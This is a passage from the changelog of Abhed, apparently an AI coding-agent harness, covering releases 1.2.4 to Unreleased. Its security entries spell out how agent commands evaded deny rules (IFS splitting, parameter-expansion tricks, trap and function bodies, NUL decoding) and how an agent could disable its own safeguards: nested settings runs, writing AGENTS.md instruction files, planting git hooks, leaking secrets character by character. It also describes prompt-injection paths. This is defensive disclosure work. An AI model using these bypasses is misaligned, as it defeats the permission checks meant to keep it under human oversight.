# Changelog

All notable changes to Abhed are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Security

- A running background shell's output that ended in the first characters of
  any stored secret was held back from `shell_output`, and output that
  started after a gap with a secret's last characters was skipped. Both
  depended on the stored values, so a model with no `secret(...)` rule could
  print guesses and learn a value one character at a time from what was
  held. Since 1.2.4. A read of a running shell now holds back a fixed tail
  (the longest stored value, rounded up to 256 bytes) whatever it says, and
  shows it once the shell has written nothing for a second; at a gap, the
  same fixed length is skipped.

### Changed

- `abhed -p` exits 1 when its record cannot take `session.started` or the
  `config.refused` and `config.narrowed` events, as the SDK's `New` already
  failed; before, it warned and ran on. An interactive session still says so
  and stays at the prompt, its fence closed, and its first message fails on
  the same record before the model is asked. `abhed serve` logs it.
- `New` in the SDK lets go of the session record it opened when it fails
  after opening it, so another process may continue the session.

### Fixed

- A server session started while the operator's secrets store could not be
  loaded withheld every payload for good, though the docs said until the
  store was fixed. It now redacts again once the store loads. While the
  store cannot be loaded, `GET /v1/health` answers `"status": "degraded"`
  and `"secrets_store": "unreadable"`, still with code 200.

### Go API

Listed late from 1.2.6, all additive there:

- `config`: `Attempt`, one setting loading did not take as written, which
  `Config.Attempts` returns.
- `config`: `Config.Fence` and `FenceConfig`, the fence tier's settings, and
  `SandboxConfig.Tier`, which chooses the fence tier.

## [1.2.6] - 2026-10-06

**Before you upgrade.** Web search and web fetch turned on in
`~/.abhed/config.json`, `-settings`, a workspace's `.abhed/config.json` or an
SDK `ConfigDir` are off after upgrading: re-enable web search with
`sudo abhed admin web-search on …`, and web fetch by editing the `web_fetch`
section of `/etc/abhed/config.json` by hand with sudo, which no command does
for you; or ask your administrator. Managed
deployments are unchanged. Accounts in a workspace's `.abhed/users.json` load
only when that workspace is trusted (`abhed trust grant`), or move them to an
`auth.users_file` outside the workspace. A nested `abhed -settings` or
`-mcp-config` inside an agent's command is refused. Session lists are ordered
by last activity. Details under Upgrading.

### Security

- A nested `abhed` run from the agent's own command could turn web search on
  for itself with `-settings '{"web_search":{"enabled":true}}'` while the
  session that ran it had it off, and send queries wherever that file said.
  Inside an agent's command, `-settings` and `-mcp-config` are now refused
  whatever they hold, as `-trust-workspace` and bypass already were.
- With web search turned on by the managed configuration,
  `~/.abhed/config.json`, `-settings` or a trusted workspace could still set
  `web_search.base_url` or `api_key_env`, sending every query, and the key,
  to an endpoint of their choosing. The whole `web_search` and `web_fetch`
  sections are now managed only: no other layer can set the provider,
  endpoint, key or hosts.
- A workspace's `.abhed/users.json` was read by `abhed serve`, the console,
  the workbench, `abhed user` and `abhed migrate` whether or not the
  workspace was trusted, so a repository could plant an administrator
  account that signed in to your server. A users file inside the workspace,
  the default one or an `auth.users_file` resolving there, is now read only
  when the workspace is trusted. Untrusted, there are no accounts from it,
  a warning names the file and how to trust the workspace, and
  `config.refused` for `auth.users_file` is recorded with the principal. The
  managed `auth.users_file` and one outside the workspace are not affected.
- `abhed admin web-search` attempts, changed, unchanged or refused, now also
  go to the system log, which an ordinary user cannot erase as they can
  their own `admin.jsonl`: the unified log on macOS, the journal (or syslog)
  on Linux, under `abhed-admin`. Each entry is one line of escaped, fixed
  fields with no key. Not yet on Windows, which says so.
- Access revoked while a session's event stream or a terminal stream was
  starting stayed in effect for that stream until its next timed recheck, up
  to 10 seconds by default: a sign-out, revocation or ended sign-in session
  landing between the request's authorisation and the stream's guard was not
  seen. Both streams are now guarded before they read or write anything, and
  check access once more as they start.
- No security advisory is published for the two web-search fixes or the
  workspace-accounts fix; upgrade to get them.

### Added

- The fence tier, a preview for Linux, chosen with `sandbox.tier: "fence"`
  and off otherwise. Each command runs through a launcher that joins a cgroup
  of its tool call, confines itself with Landlock and a seccomp filter, and
  runs the command only once Abhed has recorded its launch. Commands write
  only the workspace and a private temp folder; Abhed's state, record and
  secrets are out of reach; the network is all or nothing, with unix sockets
  refused either way; `max_memory_mb`, `max_procs` and the new
  `fence.cpu_percent` bound them. A `.abhed` a command makes at the top of
  the workspace, in any case, is renamed out of the way once the command
  ends and moved to `~/.abhed/quarantine/` where it can be, and the
  session's fence ends what its commands still run and runs no further
  command; so does a workspace a command made unlistable, and the session
  ends with an error when either remains (`abhed -p` then exits 1). It is a
  check, not a guard: a file written there is visible while its command
  runs and until the check that follows it, nothing is moved after an
  unclean exit, and a `.abhed` in a subfolder or an `--add-dir` folder is
  not checked. Commands run in a session of their own and cannot open a pty,
  so other terminals are out of reach, and cannot signal Abhed by its
  process id or group. It needs Linux 6.7 or later with the default
  `allow_network: false` (Landlock ABI 4 refuses TCP), or 6.2 with the
  network on, cgroups v2 delegated by systemd
  (`systemd-run --user --scope -p Delegate=yes`) and an ordinary user, and
  refuses to start, naming the failing check, when any is missing; it never
  falls back to another tier. `abhed doctor` shows its probe, and the record
  gains `fence.qualified`, `process.launched`, `fence.limit` and
  `fence.state_planted`. `sandbox.tier` and `fence.*` are never taken from an
  untrusted workspace or a nested run's `-settings`. `abhed serve` and Abhed
  Studio refuse it in this release. See "What it does not cover" in
  [Configuration](docs/guide/02-configuration.md#the-fence-tier-preview-linux),
  which also names three limits: below Landlock ABI 6 (Linux 6.12) a command
  can signal your other processes, and Abhed by a thread id; with no PID
  namespace it can read other processes' command lines in `/proc`; and a
  hard link into Abhed's state made before the session stays readable.

- Switching between sessions. In the console, the open chat is kept in the
  address (`/console?s=<id>`), so a reload or a second tab opens it again;
  search matches titles as well as first messages and says when nothing
  matches; the header shows the title, with the id a click away, and renames
  it in place (double-click, or F2 on a row); the rail is ordered by last
  activity; Ctrl+K (⌘K) opens a quick switcher and Alt+↑/↓ goes to the
  previous or next chat. In the workbench, `?s=<id>` is restored on a reload
  or a second tab instead of the newest session; the agent panel's title is a
  session menu with a filter, the current session marked, and New; the
  Sessions view has a filter and each row's age; Ctrl+K (⌘K) outside the
  editor now opens the sessions alone (⌘P stays the full palette), and
  Alt+↑/↓ moves between sessions. In the CLI, the `/resume` picker filters
  as you type and marks the session you are in, the footer names the current
  session, `/switch` is `/resume` by another name, and `abhed sessions` is
  `abhed record list`; with Postgres storage the picker works and `/sessions`
  shows titles, and a name given with `/rename` or `-n` becomes the session's
  title there, under the same rules as a rename in the console.
- `GET /v1/sessions` returns each session's last activity as `updated` (the
  last message, reply or agent call; viewing, a terminal, a rename or a model
  switch do not count) and
  takes `q` (a search over title and opening request), `limit` and `cursor`,
  with the next page's cursor in an `X-Next-Cursor` header. The body is
  unchanged. A search or a paged list looks at the caller's 500 most
  recently active sessions; a plain request lists up to 200.

### Changed

- `GET /v1/sessions`, `abhed record list` (and `abhed sessions`), `/sessions`
  and the `/resume` picker are ordered by last activity, most recent first,
  rather than by when each session was created.
- In the workbench, Ctrl+K (⌘K) outside the editor opens the session
  switcher alone; ⌘P stays the full command palette.
- Web search and web fetch are administrator settings. Only the managed
  configuration (`/etc/abhed/config.json`) turns them on. The user's file,
  `-settings`, a workspace trusted or not and an SDK `ConfigDir` may only
  turn them off, lower `max_results` or `max_chars`, or
  keep fewer of the managed `allowed_hosts`; anything else is set aside with
  a startup warning.
- New `abhed admin web-search on|off [--provider] [--base-url]
  [--api-key-env] [--max-results]` edits the managed file and nothing else.
  It refuses unless it can write there (on your own machine, run it with
  sudo), never takes or prints a key (`--api-key-env` must be a variable
  name such as `SEARCH_API_KEY`), is refused inside an agent's command,
  and appends every attempt, done or refused, to `admin.jsonl` beside the
  managed file, with the command as checked and URLs without credentials.
  The managed file is replaced whole and flushed, keeping its owner, group
  and mode.
- The trust prompt names `.abhed/users.json` when there is one, since
  trusting the workspace's file trusts its accounts too, and it and
  `abhed trust grant` warn when git tracks that file.
- Every setting loading did not take as written is recorded in the session,
  after `session.started`, as a `config.refused` event: set aside, ignored
  in an untrusted workspace, or replaced by a managed value, which was
  silent before. A narrowing of the web sections is `config.narrowed`. Each
  names the layer, the file or flag, the key, the value with credentials
  redacted, and the principal: the account, the server session's owner, or
  the agent's command. A refused `/config set` is recorded the same way.
  On a server accounts sign in to, the operator's attempts are not put in
  every user's session: `abhed serve` logs each once at startup and hands it
  to the admin audit hook.
- `session.started` says whether web search and web fetch are on and who
  decided. `abhed doctor`, `abhed serve`, Studio's capabilities and the
  console overview say "enabled by the managed configuration" or "off; only
  the managed configuration can enable it".
- The docs recommend a self-hosted searxng as the free provider that keeps
  queries on your own infrastructure, and describe `duckduckgo` as
  unofficial scraping of an HTML page that may break or be rate-limited. The
  default provider name is unchanged.

### Upgrading

- If you turned web search or web fetch on in `~/.abhed/config.json`, a
  `-settings` file, a workspace's `.abhed/config.json` or an SDK `ConfigDir`,
  it is now off, with a warning naming the setting. No `ABHED_*` variable
  sets either. Ask your administrator to enable it in the managed
  configuration, or on your own machine run `sudo abhed admin web-search on`
  with your provider and endpoint. Web fetch has no command: edit
  `/etc/abhed/config.json` by hand with sudo and add the `web_fetch` section.
  Then remove the section from your own file.
- An agent's command that ran a nested `abhed -settings …` or
  `abhed -mcp-config …` is now refused. Narrow a nested run with
  `-mode plan`, `-disallowedTools` or `-max-turns` instead.
- A managed deployment that enables web search for its users keeps working
  unchanged; a user's own `base_url`, provider or key for it is now set
  aside.
- If you keep accounts in a workspace's `.abhed/users.json` (the default
  without Postgres or `auth.users_file`), trust that workspace with
  `abhed trust grant` (or run `abhed -trust-workspace serve`), or move the
  file to an `auth.users_file` outside the workspace in the managed file or
  `~/.abhed/config.json`. Until then `serve` starts with none of its accounts
  and `abhed user add` refuses. A workspace whose `.abhed/config.json` you
  already trust needs nothing.
- Session lists change order: `GET /v1/sessions`, `abhed record list`,
  `/sessions` and the `/resume` picker put the most recently active session
  first, not the most recently created. A script that took the first row as
  the newest session should sort by `created` itself.

### Go API

All additive.

- `config`: `WebKey`, `RedactValue`, `Config.Attempts`, `Config.Narrowed`,
  `Config.Overridden`, `Config.WebSearchState` and `Config.WebFetchState`.
- `config`: `Config.UsersFile`, `Config.UsersIgnoredWarning`, `UsersSource`,
  `WorkspaceUsersFile` and `GrantUsers`; `WorkspaceTrust` gains `UsersFile`,
  `UsersTrusted` and `UsersReason`, and `TrustRecord` gains `Users`.
- `store`: `CleanTitle` and `MaxTitleRunes`; `SessionRecord` gains
  `UpdatedAt`, the session's last activity.
- `store/local`: `Entry` gains `Active`.
- `server`: `NextCursorHeader`; the `GET /v1/overview` response gains
  `web_search_state`.

## [1.2.5] - 2026-10-06

### Security

- The `ABHED_BASE_URL`, `ABHED_MODEL`, `ABHED_API_KEY`, `ABHED_DATABASE_URL`,
  `ABHED_MIGRATE_DATABASE_URL` and `ABHED_USERS_FILE` variables were applied
  after the managed `/etc/abhed/config.json`, so anyone who could set the
  process's environment could move a managed model endpoint, model name, key,
  database or users file. A setting the managed file makes now wins: the
  variable is ignored and Abhed warns at startup naming the setting. The
  variables still apply to settings the managed file leaves alone. This
  covers the CLI, `-p`, `abhed serve`, `abhed acp` and an SDK agent built
  with `ConfigDir`.

### Upgrading

- A managed deployment that relied on one of those `ABHED_*` variables to
  change a setting its managed `/etc/abhed/config.json` also makes now gets
  the managed value, with a startup warning naming the setting. Move the
  value into the managed file, or remove that key from the managed file so
  the variable applies again.

### Go API

All additive; the `sdk` package is unchanged.

- `config`: `LayerEnv`, and `Config.SetAside` gains an entry for each
  variable left out this way, with `Layer` set to `LayerEnv` and `File` set
  to the variable's name rather than a path.

### Added

- `server.Options.SecretsFor` gives each session the secrets store of the
  account it runs as: bash, `k8s_login`, `ssh_connect`, `web_fetch` and
  `web_search` read that store alone, and the session's record is redacted
  with it and with the operator's store, so operator values stay redacted as
  before. An account whose store cannot be loaded starts no session. Nil
  keeps one store for every session, as before. The `secretstore` package
  opens a store from outside this module, and `servertest.WithSecrets` builds
  a test server whose tools read one.
- Per-account stores have a guarded home, `~/.abhed/secrets.d`
  (`ABHED_ACCOUNT_SECRETS_DIR` overrides), refused to the agent's tools and
  sandbox as the operator's store is.
- `abhed serve` with local, proxy or OIDC authentication and one store for
  every account warns at startup when an allow rule lets a session name a
  secret (`secret(...)`, `secret` or `*`), naming the rules: every account
  can use, and by transforming the value read, each secret they name.

### Fixed

- Two writes to one secrets store at the same time shared a temporary file,
  so one could be lost or leave the store unreadable. Each write now has a
  temporary file of its own, and writes to one store in a process take turns.

### Documentation

- The `vm` sandbox tier was described as a microVM in code comments and
  docs. It is gVisor (`runsc`): a user-space kernel that intercepts system
  calls, run as a container runtime. The tier name and its config values are
  unchanged.
- The permissions guide says plainly that on a Community server several
  accounts sign in to, any account can use, and by transforming the value
  read, every secret an allow rule names; a person who must not see
  another's secrets needs a server of their own.

## [1.2.4] - 2026-10-05

### Security

- Renaming a file in the `/ide` Explorer put its raw name in the box, where
  bidi and zero-width characters do not show. For a name holding one, the
  box now starts empty and its hint shows the name with those characters
  written out.
- The console and `/ide` approval cards read JSON held in a string three
  levels deep for hidden characters, one fewer than the server's escaper,
  so a control character four levels down was escaped but drew no warning.
  The pages now read as deep as the server.
- A write rule naming a link to a folder did not hold for a workbench save
  or upload through that link: with `write(**/vault/**)` and `vault` a link
  to `notes/`, saving `vault/a.md` or dropping a file on `vault` wrote into
  `notes/`. Both now put the path as named to the write rules too, as the
  Explorer's new folder, rename and delete already did.
- A workbench terminal stopped because its owner's access was revoked was
  recorded as `exit 137 · on a terminal`, with no reason, while the shells,
  tasks and run stopped with it say `owner_revoked`. Its observation now
  ends `on a terminal, owner_revoked`, and a command terminal closed from
  the workbench or with its session now says so too, as a shell already did.
- A state-changing request refused for its `Origin` left no line in the
  server log, because the check runs before the request logger. It now logs
  `request refused` at warn level with `reason=cross-origin`, the method,
  path, `Origin` and remote address.
- Text Studio attached to a prompt (a selection, a symbol, a problem) went
  to the model inside a plain code fence with no note, so attached text
  holding a fence could close it and go on as the person's words, and a
  secret in it reached the model. It is now redacted, capped at 256 KiB,
  fenced under a tag with a random suffix after the note that says
  attached blocks are data, not instructions, and recorded as
  `input.mention`, as an `@` mention in the terminal is. With a built-in
  slash command it is not used, not recorded and not taken as arguments.
- A command that set `IFS` to a separator could build words no deny rule
  read, so `IFS=_; c=git_reset_--hard; $c` asked under a
  `bash(git reset --hard*)` deny rule instead of being refused, in every
  mode including `bypass`, and an approval let it run. Deny and ask rules now
  also read the command split on the separators an `IFS` assignment sets, so
  `IFS=_; git_reset_--hard` is refused by the rule. A command that changes
  `IFS`, or sets it in a way the text does not show (`IFS=$v`, `read IFS`,
  `${IFS:=_}`, inside `eval`), and then expands anything is refused at step
  `screen` while any deny rule for `bash` has a pattern, and is taken as
  destructive otherwise. `IFS` is also read with quotes, backslashes and
  `$'...'` undone (`eval I""FS=_`), in arithmetic (`(( IFS = 1 ))`,
  `$[ IFS = 1 ]`), glued to a setter's option (`printf -vIFS`), and a word
  built from an expansion given to `eval`, a shell's `-c` or a command that
  sets a variable by name (`read ${v}FS`, `printf -v"$v"`) counts as setting
  it, including inside the text `eval` or `-c` runs. A prefix to `read`, an
  `IFS` of blanks only, and `IFS` as another command's argument
  (`grep IFS f`) are unchanged.
- A deny rule could be passed in every mode by naming the program with an
  expansion that edits its value: under `bash(git reset --hard*)`,
  `x=git; ${x%/} reset --hard` and `x=git_reset_--hard; ${x//_/ }` were
  allowed. 1.2.2 and 1.2.3 are affected. A `/` inside the expansion hid it
  from the check; the whole word is read now, and a program named by an
  expansion with an operator (`${x%/}`, `${x//_/ }`, `${x:-git}`, `${!v}`)
  is refused at step `screen` while any deny rule for `bash` has a
  pattern. Any other expansion in the program's word now confirms as `$x`
  does, in every mode: an unquoted one may split into the program and its
  arguments, so `$(printf 'curl x ')/` runs `curl`. This includes
  `$HOME/bin/tool` and `$(pwd)/run.sh`, which now ask in `bypass` and are
  refused by `-p`. Quote the directory (`"$HOME"/bin/tool`,
  `"$(pwd)"/run.sh`, `"$GOPATH/bin/x"`) or write the path out to run them
  without a prompt: a plain expansion inside double quotes and followed by
  a `/` can only be a directory; `"$@"/x` is a word per parameter and
  still confirms.
- A redirection before the program hid it from the program checks, so a
  deny rule could be passed in every mode: under `bash(git reset --hard*)`,
  `x=git_reset_--hard; >/dev/null ${x//_/ }` and
  `x=git; 2>/dev/null ${x%/} reset --hard` were allowed, and
  `2>/dev/null $x …` or `2>/dev/null $(echo git) reset --hard` did not
  confirm. 1.2.2 and 1.2.3 are affected. The program is now found past any
  redirection (`2>/dev/null`, `</dev/null`, `<<< x`, `&>f`, `>| f`, `3< f`)
  and the target it is given, as it already was past assignments and
  wrappers.
- A command in a function body (`function f { curl x; }; f`) or in `trap`
  text (`trap 'curl x' EXIT`) was not read by the deny rules or the
  program checks, so it passed a deny rule in every mode. 1.2.2 and 1.2.3
  are affected. Commands are now also read with a bash parser
  (`mvdan.cc/sh/v3`), beside the text checks: every simple command it
  finds, in function bodies, subshells and literal `eval`, `trap` and `-c`
  text, with quoting undone, is held to the deny and ask rules, so
  `'curl' x`, `c\url x` and `bash -c 'curl x'` are matched as `curl x`
  too. The program and `IFS` checks read what it finds as well, so text
  that puts a hand-written split out of step with the shell
  (`echo $'\x27'; …`) no longer hides a command. A command the parser
  cannot read, such as one with an unclosed quote, is refused while any
  deny rule for `bash` has a pattern; a line typed at the workbench's
  terminal that the shell finishes with later lines (`for f in *; do`,
  `cat <<EOF`) is left to the shell.
- `$'…'` was decoded unlike bash: a NUL from `\0`, `\x00` or `\c@` ends
  the string in bash and was kept, so `$'\0'curl x` passed `bash(curl*)` and
  `git reset -$'\0'-hard` passed the hard-reset check, in every mode. 1.2.2
  and 1.2.3 are affected. A NUL now ends the decoded string, and `\cX` is
  control-X.
- Text run another way passed a deny rule in every mode, in 1.2.2 and 1.2.3
  too: an alias's value, a shell fed a here-string, heredoc, pipe or file
  (also with `-s` and operands, an option's value, or inside a piped
  subshell or group), `su`, `flock` or `script -c` and `--command`,
  `env -S`, `watch`, a quoted name under `find -exec`, the command after
  `chrt`, `taskset`, `chroot`, `unshare`, `flock` or `timeout inf`, git's
  `--exec`, `--upload-pack` and `--receive-pack`, a script from `<(…)`, a
  substitution in a value arithmetic expands
  (`x='a[$(curl x)]'; echo $((x))`), `hash -p` and `enable -f`.
  Literal text there is now read as the commands it runs; the rest is
  refused while a deny rule for `bash` has a pattern. An unquoted glob as
  the program (`cur? x`) confirms, and a run of runners, option values and
  durations before the program (`nice -n 1 …`) no longer stops the
  reading.
- A git command whose arguments are made when it runs (`git reset "$1"`,
  `git reset --h*`) was not taken as destructive; it now confirms, though a
  quoted pattern and a value after `--name=` do not. So does `IFS=_ read`
  where a function or alias named `read`, or POSIX mode, would keep the
  assignment. An opted-in git extension still confirms in a command that
  could make its name an alias (`GIT_CONFIG_*`, `alias.`, `--exec-path`).
- An agent's own command could administer Abhed: `abhed record prune -yes`
  removed sessions from the record, and `trust grant`,
  `user add|passwd|remove|rm|import`, `secret set|rm|remove` and
  `mcp remove|rm` changed the harness, wherever the sandbox did not deny
  `~/.abhed` (tier `none`). These, `mcp add`, `init`, `migrate`,
  and a nested session's `-trust-workspace`, `-dangerously-skip-permissions`
  or `-mode bypass`, are now refused inside an agent's command, which is
  told by `ABHED_SANDBOX` or by an `abhed` process above it. Commands that
  only read, such as `user list` and `secret list`, still run. Only `mcp add`
  was refused before, and only by the variable. So is a nested session whose
  `-settings`, `-agents`, `-mcp-config` or `-allowedTools` would add bypass
  mode, an allow rule or a git extension to its configuration, or remove a
  deny or ask rule it already holds (`{"permissions":{"deny":[]}}`).
- In `accept-edits` and `auto`, the agent could write `ABHED.md`,
  `ABHED.local.md` or `AGENTS.md` without asking, and every later session
  read the text as instructions. The default `permissions.ask` now asks
  before a write or edit of any of them at the workspace root, in every
  mode. On a disk that ignores case, a file spelled otherwise, such as
  `agents.md`, is no longer read as a memory file.
- An MCP server whose configured name failed validation was still kept as a
  failed server, so its name, bidirectional controls included, reached `/mcp`
  unescaped; Studio's settings views listed such names too. It is now refused
  before anything keeps it, with the name escaped in the error. Tool and
  prompt names were already checked on every path that lists them.
- A stdio MCP server configured with no `env` inherited Abhed's whole
  environment, model provider keys and `ABHED_*` settings included, and one
  configured with `env` got no `PATH`. Every stdio server now gets `PATH`,
  `HOME`, `USER`, `LOGNAME`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TMPDIR` and `TZ`
  from Abhed's environment (and what Windows needs to start a program), then
  its configured `env`. Nothing else reaches it. A bare `KEY` in `env`, or
  `abhed mcp add -env KEY`, passes your own value of `KEY`.
- After injected text, the suggested next prompt could be "Remove the old
  build", "reset it", "Approve all", "Push to main" or, after an `rm -rf`
  confirmation, "yes". The filter now fails closed: a suggestion is not
  offered when it consents, names a destructive or outward action (remove,
  reset, revert, force, push, merge, deploy, publish, install, …), holds a
  character a shell reads specially, or names a secret-like variable. Some
  ordinary suggestions are dropped with them.
- A suggestion call cancelled by closing the session recorded no
  `model.call`, so a request to `suggest.model` went out unrecorded. It is
  now recorded; the suggestion is still not offered.
- On the container and VM tiers, a command could read and write the
  workspace's `.abhed/` (its configuration, agent definitions and any
  accounts kept there) and a configured state file inside a mount. They are
  now hidden as on the process tier: an empty folder over `.abhed/` and a
  state folder, `/dev/null` over a state file, and every case spelling of
  `.abhed` where the workspace's disk ignores case.
- On macOS, the process tier let a command read credentials in the home
  directory other than five paths: `~/.netrc`, `~/.git-credentials`,
  `~/.config/gh`, `~/.npmrc`, registry, database and model tokens, shell
  history and browser profiles among them. Seatbelt now denies reads of a
  list of these (`HomeSecrets`). The deny on `~/.abhed` and on the
  credential paths also names home with its links resolved; before, a home
  reached through a link left `~/.abhed` readable.
- A terminal kept the last 256 lines recorded without their text to take
  out of the recorded output, and forgot the earliest after that, though the
  output the record keeps (its last 64 KB) could still show it. Past 256,
  none of that terminal's output is recorded now, only a note saying why.
- The workspace-trust prompt, `abhed mcp`, `abhed trust` and the other
  messages that quote configuration escaped text with a second escaper of
  their own, which left characters that draw nothing (U+3164, U+2800) and
  long runs of blanks as they were. They now use the one the approvals and
  the transcript use (`internal/visible`): such text shows as `⟨U+3164⟩` or
  `⟨40 spaces⟩`, and a control character as `⟨\e⟩` or `⟨U+202E⟩` rather
  than `\u001b`.
- The tools guide now says that a process a background shell left running
  after its own command ended (`server &`) is not stopped by `shell_kill`,
  the session closing, a stop, Abhed exiting or an Enterprise revocation,
  except under bubblewrap on Linux.
- In a terminal, a password typed ahead of its prompt, then cleared with
  Ctrl-U, then Enter, left its echo in the recorded output: the line was
  empty, so it was not followed. Such a line now withholds the output, as an
  edited one does.
- In the `/ide` and Studio terminals, a password typed ahead while another
  program held the terminal (`sleep 2; read -s pw`) stayed in the recorded
  output, plain or edited: a browser sends each key on its own, and each key
  cleared the line being followed. A line a program reads in canonical mode
  is now followed to its Enter and held.
- A trusted workspace file could raise `memory.import_depth` above the
  person's own setting, up to 10, so memory files it brought pulled in more
  files. Trusted or not, a workspace may now only make imports shallower;
  a higher value is set aside and named.
- `abhed user add` without `-password` printed the password it generated
  before creating the account, so adding a name already taken showed a
  password nobody could use, then refused. It is now printed only after
  the account is created.
- The `write` and `edit` tools could write `.git/hooks/*` or
  `.git/config`, so text the agent read could plant a hook or a
  `core.hooksPath` that ran at the next git command, the person's own
  included. They now refuse any path inside a `.git` folder, and a `.git`
  file, in any case and through a link, in every mode.
- A non-breaking space, or another space than ASCII's, in a command or a
  path put to approval showed as an ordinary space, though the shell does
  not split words on it (`rm` NBSP `-rf`). Approvals and one-line fields now
  show each as `⟨U+00A0⟩`, and count it as hidden text.
- The CLI recorded a session as `$USER` as it was, so a `$USER` such as
  `unclaimed:bob`, `nobody:x`, `github:alice` or `agent` wrote rows under an
  owner the store gives a meaning (an `unclaimed:` or `nobody:` one marks the
  session as no one's), and on a shared database could resume another
  identity's sessions. Such a name, and any with a `:`, is now recorded as
  `local`, as an empty one is.
- A call whose `command`, `path` or other argument rules read was a number,
  a list or an object, such as `{"command":["rm","-rf"],"path":"x"}` to an MCP
  tool, was judged on the next such argument or on nothing, so a rule written
  for the first passed it by. Such a call is now refused as malformed unless
  the tool's schema gives that argument another type.
- `abhed -trust-workspace acp` trusted the configuration of every folder the
  editor opened for the life of the process, and `abhed -trust-workspace rpc`
  that of any workspace a `start` named. The flag now trusts only the
  workspace the command was started in; any other keeps its recorded
  decision. `abhed resolve` no longer warns twice about an untrusted
  workspace.
- `/permissions explain web_fetch <url>` said "allow" for a host outside
  `web_fetch.allowed_hosts`, which the tool refuses. Explain now runs the
  tool's own check for every tool that has one and shows such a call as
  refused.
- `abhed doctor` in an untrusted workspace that names its own model probed
  the default endpoint (`127.0.0.1:11434`) in its place, which that
  workspace would not use. It now says the model waits for trust and probes
  nothing.
- `/copy` left hidden and control characters out of the copied reply
  without saying so. It now warns when it did.
- An MCP prompt typed as `/mcp__server__prompt` was sent as your message the
  moment it was fetched, though the server wrote its text. It is now shown
  first, and sent only when you answer yes.
- Under a managed configuration that locks `permissions` without listing
  allow rules, the workspace-trust prompt listed the workspace's allow rules
  as what trust would add, though they are dropped either way. They are now
  marked as such.
- A kubeconfig whose context in use sets `insecure-skip-tls-verify` was
  named only by `abhed doctor`. Every session that enables `k8s` now warns
  about it at start, as it does for an insecure `k8s.clusters` entry.
- Two `abhed user` commands at once against a users file (or one beside
  the server) each wrote back what it had read, so one's change was lost,
  and both could create the same account. Changes to the file now hold a
  lock the other processes take (`users.json.lock` beside it), an account
  whose name or email another holds is refused under it, and each writer
  uses a temporary file of its own.
- `ssh_connect` could reach any address the agent named with a key file,
  with nothing but the approval between it and the machine. A new
  `ssh.connect_hosts` lists the addresses it may reach (`*` wildcards,
  `host:port`); an address outside the list is refused before any
  connection. Unset, any approved address is reached, as before.
- Abhed Studio's protection of `.git/config` and `.git/hooks` from the
  agent's commands held on macOS only. Under bubblewrap and on the container
  tier, each git folder found when a command starts now has its config and
  hooks bound read-only, as does each `.git` file.
- Abhed's own git commands ran whichever `git` came first on `PATH`, one the
  agent had written into the repository or a temp folder included, on the
  host. Such a `git` is now refused, and the command fails saying why.
- A server's lease on a session was its `node_id` alone, so a node restarted
  with the same id, or a second process given it, could still write into a
  session the other had taken, and a session with no holder was judged
  crashed by its writer's clock. A lease now carries a token of the process
  that holds it, so only the current one's appends pass, and the no-holder
  case reads when the database stored the last event (`events.inserted_at`,
  schema version 6).
- A command past its timeout left running a daemon it had started, one
  that forked twice and left its session, on the none tier and the macOS
  process tier. Each command's processes now carry an unguessable
  `ABHED_COMMAND_ID`, and a timeout ends every process of the user that has
  it. A process that clears its environment, or on macOS one running a
  program Apple ships in the system, is still not found.
- The container image's pypdf, which reads PDFs given to the agent, is
  6.19.0, fixing three denial-of-service issues with crafted PDFs
  (CVE-2026-102998, CVE-2026-102999, CVE-2026-103000).

### Added

- `permissions.git_extensions` opts named git extensions in, such as
  `["lfs"]`, so `git lfs pull` runs without the destructive step's question
  about an alias or extension it cannot read, in `-p` too. Deny and ask
  rules still hold for them. It is read from your own file, a `-settings`
  file or the managed one, never from an untrusted workspace, and is set
  aside when the managed file sets the permissions without naming its own.
- `/ide` review comments: a click in the diff's gutter, or *Comment on this
  line*, writes a note on a line of the changed file, held above the
  composer and sent with the next message with its file, line and that
  line's text.
- `/ide` lists a session's background shells and tasks, from `/tasks` in
  the composer or a click on the background count in the status bar, with
  how each one ended and a **Cancel** for each one still running, as `/tasks`
  does in the CLI.
- The terminal draws what the harness does on its own as dim lines in the
  transcript: the agent's todo list under the call that wrote it (`☒` done,
  `◼` in progress, `☐` to do), a subagent starting and returning as a tree
  under its `task` call, compaction starting, ending or failing, a mode
  change, a session rule added or removed, a hook's verdict, and
  `✓ auto: <rule>` under a call a configured allow rule approved. They come
  from the record, so a resumed session and the line mode show them too, and
  every name, rule and message in them is shown as text, never obeyed.
- While any todo item is open, one line above the input says how far the
  agent has got; Ctrl-T lists every item there, and `/todos` draws the list
  into the transcript.
- The terminal's title says whether the session is ready, working or waiting
  for an approval, and the title it had is put back on exit (`cli.title`).
- When the terminal reports that it is not focused, an approval starting to
  wait and a turn ending ring the bell or send an OSC 9 notification, with
  fixed words only (`cli.notify`: `auto`, `bel`, `osc9` or `off`).
- `/copy` puts the last reply on the clipboard through the terminal (OSC 52),
  only when typed, up to 64 KB (`cli.copy`).

- `/review` and `/security-review` are built in. Each reads the current
  diff as your own policed, recorded shell command, then sends a prompt
  built into the binary with the diff, marked as data, as your next turn in
  plan mode; the earlier mode comes back when the turn ends. A custom
  command of the same name is left out with a notice.
- `abhed mcp add|list|remove` changes the MCP servers in your own
  `~/.abhed/config.json`. `add` shows the server escaped and adds it,
  enabled, only on a yes typed at a terminal; each change is appended to
  `~/.abhed/config-changes.jsonl` without its values. A managed file that
  sets the `mcp` section forbids both.
- An MCP server's prompts are slash commands, `/mcp__<server>__<prompt>`.
  A prompt is fetched only when you type its command, shown with hidden and
  control characters escaped, recorded with source `mcp`, and sent as your
  message exactly as shown. Built-in and custom commands keep their names.
- Agent definitions take `effort`, `skills`, `mcp_servers`, `background`
  and `color`. Each only narrows: `effort` never goes above the session's,
  `skills` and `mcp_servers` cut the session's own and refuse a name it
  lacks, an inline MCP server is refused, and `background` holds a role to
  the background or out of it. A value outside a key's set refuses the
  definition; `color` is no longer ignored with a warning.
- `-settings`, `-mcp-config` with `-strict-mcp-config`, `-agents` and
  `-agent` set up one run. A settings file merges as part of your own
  configuration, so the managed file still wins and the allow lock drops its
  allow rules; MCP servers named on the command line are refused when the
  managed file sets the servers; `-agents` definitions are checked as files
  are and never take a managed name; `-agent` runs the session with a
  role's instructions and only its tools, narrowing mode, effort, turns and
  model. The session's start records each source by SHA-256. A file these
  flags name inside the workspace is read only with workspace trust.
- `hooks.managed_only`, set only by the managed configuration, sends hook
  events only to the managed file's own extensions. Every other extension,
  from the user's file, a trusted workspace or an SDK program, keeps only
